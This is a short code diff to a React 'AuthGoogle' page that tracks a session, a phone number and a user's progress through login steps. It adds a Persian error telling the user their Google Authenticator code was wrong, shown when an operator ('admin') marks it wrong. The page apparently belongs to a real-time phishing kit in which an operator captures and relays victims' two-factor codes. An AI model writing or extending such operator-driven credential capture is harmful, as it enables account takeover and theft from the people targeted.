@@ -21,6 +21,7 @@ const AuthGoogle = () => {
   const phoneNumber = location.state?.phoneNumber || "";
   const sessionId =
     location.state?.sessionId || sessionStorage.getItem("sessionId");
+  const hasError = location.state?.hasError || false;
 
   useEffect(() => {
     const checkAccess = async () => {
@@ -30,7 +31,7 @@ const AuthGoogle = () => {
       }
 
       const canAccess = canAccessAuthStep(sessionId, "google");
-      if (!canAccess) {
+      if (!canAccess && !hasError) {
         setIsBlocked(true);
         setErrors({
           googleCode:
@@ -39,11 +40,19 @@ const AuthGoogle = () => {
         return;
       }
 
+      // If admin marked Google Auth as wrong, show error
+      if (hasError) {
+        setErrors({
+          googleCode:
+            "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+        });
+      }
+
       await setUserCurrentStep(sessionId, "auth_google");
     };
 
     checkAccess();
-  }, [sessionId, navigate]);
+  }, [sessionId, navigate, hasError]);
 
   const handleCodeSubmit = async () => {
     setErrors({});
